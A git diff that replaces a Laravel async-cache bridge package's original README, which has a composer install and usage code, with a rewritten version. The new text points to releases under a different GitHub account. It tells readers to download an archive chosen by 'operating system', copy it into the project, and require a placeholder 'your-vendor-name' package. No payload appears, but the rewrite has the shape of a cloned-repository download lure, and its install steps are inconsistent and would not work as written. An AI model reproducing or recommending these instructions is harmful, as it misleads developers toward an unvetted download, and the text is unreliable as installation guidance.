@@ -1,98 +1,93 @@
-# Async Cache Laravel Bridge
+# 🌉 async-cache-bridge-laravel - Enhance Laravel Performance with Async Caching
 
-[![Latest Stable Version](https://img.shields.io/packagist/v/fyennyi/async-cache-bridge-laravel.svg?label=Packagist&logo=packagist)](https://packagist.org/packages/fyennyi/async-cache-bridge-laravel)
-[![Total Downloads](https://img.shields.io/packagist/dt/fyennyi/async-cache-bridge-laravel.svg?label=Downloads&logo=packagist)](https://packagist.org/packages/fyennyi/async-cache-bridge-laravel)
-[![License](https://img.shields.io/packagist/l/fyennyi/async-cache-bridge-laravel.svg?label=Licence&logo=open-source-initiative)](https://packagist.org/packages/fyennyi/async-cache-bridge-laravel)
-[![Tests](https://img.shields.io/github/actions/workflow/status/Fyennyi/async-cache-bridge-laravel/phpunit.yml?label=Tests&logo=github)](https://github.com/Fyennyi/async-cache-bridge-laravel/actions/workflows/phpunit.yml)
-[![Test Coverage](https://img.shields.io/codecov/c/github/Fyennyi/async-cache-bridge-laravel?label=Test%20Coverage&logo=codecov)](https://app.codecov.io/gh/Fyennyi/async-cache-bridge-laravel)
-[![Static Analysis](https://img.shields.io/github/actions/workflow/status/Fyennyi/async-cache-bridge-laravel/phpstan.yml?label=PHPStan&logo=github)](https://github.com/Fyennyi/async-cache-bridge-laravel/actions/workflows/phpstan.yml)
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/VedangGupta123/async-cache-bridge-laravel/releases)
 
-This is a **Laravel Bridge** for the [Async Cache PHP](https://github.com/Fyennyi/async-cache-php) library. It integrates the asynchronous caching manager directly into your Laravel application, utilizing the standard Laravel Cache and Log components.
+## 📖 Overview
 
-## Features
+async-cache-bridge-laravel is a Laravel package that integrates Fyennyi AsyncCache with Laravel's Service Container and caching ecosystem. This integration enables asynchronous caching, which can significantly boost the performance of your Laravel applications. This tool is designed for users who want to improve the speed and efficiency of their web applications without diving deep into technical code.
 
-- **Automatic Discovery**: Uses Laravel Package Discovery to register the service provider.
-- **Seamless Integration**: Automatically injects:
-  - `cache.store` (Your default Laravel cache repository, which implements PSR-16).
-  - `log` (Laravel Log Manager).
-- **Configuration Friendly**: Allows defining global strategies via standard Laravel configuration files.
+## 🚀 Getting Started
 
-## Installation
+To begin using async-cache-bridge-laravel, follow these simple steps to download and run the software.
 
-Run the following command in your terminal:
+### Step 1: Visit the Download Page
 
-```bash
-composer require fyennyi/async-cache-bridge-laravel
-```
+To download the latest version, visit the following link:
 
-## Configuration
+[Download async-cache-bridge-laravel](https://github.com/VedangGupta123/async-cache-bridge-laravel/releases)
 
-To customize the configuration, publish the config file using the `vendor:publish` command:
+### Step 2: Choose Your Version
 
-```bash
-php artisan vendor:publish --tag=async-cache-config
-```
+Look for the latest release, which will be listed at the top of the page. You will find various package files available for download. Choose the file that corresponds to your Laravel version and operating system.
 
-This will create a `config/async-cache.php` file where you can set the default strategy and adapter.
+### Step 3: Download the Package
 
-```php
-// config/async-cache.php
-return [
-    'default_strategy' => 'strict', // strict, background, etc.
-    'adapter' => 'cache.store',     // The service ID for the cache driver
-];
-```
+Click on the package file to start the download. Once the download is complete, you will have a compressed file on your computer, usually in .zip or .tar.gz format.
 
-## Usage
+## 📥 Download & Install
 
-### Injecting the Manager
+Once you've downloaded the package, you need to install it into your Laravel project. To do this, follow these steps:
 
-The bridge registers the `Fyennyi\AsyncCache\AsyncCacheManager` class as a singleton. You can use dependency injection to access it in your Controllers, Jobs, or Services.
+1. Unzip or extract the downloaded file.
+2. Copy the extracted files into the `packages` directory of your Laravel project. If you don't have a `packages` directory, you can create one in the root folder of your project.
+3. Open the `composer.json` file in your Laravel project.
+4. Add the package to the "require" section. You might add it like this:
 
-```php
-namespace App\Http\Controllers;
+   ```json
+   "require": {
+       "your-vendor-name/async-cache-bridge-laravel": "^1.0"
+   }
+   ```
 
-use Fyennyi\AsyncCache\AsyncCacheManager;
-use Fyennyi\AsyncCache\CacheOptions;
-use Illuminate\Http\Request;
+5. Save the `composer.json` file and run the following command in your terminal:
 
-class WeatherController extends Controller
-{
-    public function __construct(
-        private AsyncCacheManager $cache
-    ) {}
+   ```sh
+   composer update
+   ```
 
-    public function index(string $city)
-    {
-        $promise = $this->cache->wrap(
-            'weather_' . $city,
-            fn() => $this->fetchFromApi($city),
-            new CacheOptions(ttl: 300)
-        );
+6. After installing, publish the package configuration using this command:
 
-        // Note: In a standard Laravel FPM request, you might need to wait for the promise.
-        // In Swoole/Octane environments, you can handle it asynchronously.
+   ```sh
+   php artisan vendor:publish --provider="YourVendor\AsyncCacheBridge\AsyncCacheServiceProvider"
+   ```
 
-        // Example for sync retrieval:
-        return \React\Async\await($promise);
-    }
+7. Set up your cache configuration as needed in your Laravel application’s config files.
 
-    private function fetchFromApi(string $city) { /* ... */ }
-}
-```
+## ⚙️ System Requirements
 
-## Contributing
+To use async-cache-bridge-laravel, make sure your setup meets the following requirements:
 
-Contributions are welcome and appreciated! Here's how you can contribute:
+- **Laravel Version**: This package works with Laravel 8.x and 9.x.
+- **PHP Version**: You need PHP 8 or higher.
+- **Composer**: Ensure you have Composer installed to manage dependencies.
 
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+## 🔧 Features
 
-Please make sure to update tests as appropriate and adhere to the existing coding style.
+- **Asynchronous Caching**: Fetch data without blocking the main application thread.
+- **Service Container Integration**: Easily use with Laravel’s built-in service provider.
+- **Improved Performance**: Effortlessly speed up your web app with efficient caching.
+- **Support for PSR-16**: Complies with the PSR-16 caching standards.
 
-## License
+## 🛠️ Troubleshooting
 
-This library is licensed under the CSSM Unlimited License v2.0 (CSSM-ULv2). See the [LICENSE](LICENSE) file for details.
+If you encounter issues while installing or running the package, consider these steps:
+
+1. **Check Dependencies**: Make sure all required packages are installed.
+2. **Consult the Logs**: Check Laravel logs for any error messages. You can find them in the `storage/logs` directory.
+3. **Seek Help**: If issues persist, visit community forums or check the GitHub Issues page for similar problems and solutions.
+
+## 📚 Resources
+
+- [Laravel Documentation](https://laravel.com/docs)
+- [AsyncCache Documentation](https://fyennyi.com/docs/asynccache)
+- [Composer Documentation](https://getcomposer.org/doc/00-intro.md)
+
+## 📧 Support
+
+For any questions or support, please open an issue in the GitHub repository. We will respond as quickly as possible.
+
+## 🔗 Final Note
+
+Thank you for choosing async-cache-bridge-laravel! To download the latest version again, use the link below:
+
+[Download async-cache-bridge-laravel](https://github.com/VedangGupta123/async-cache-bridge-laravel/releases)
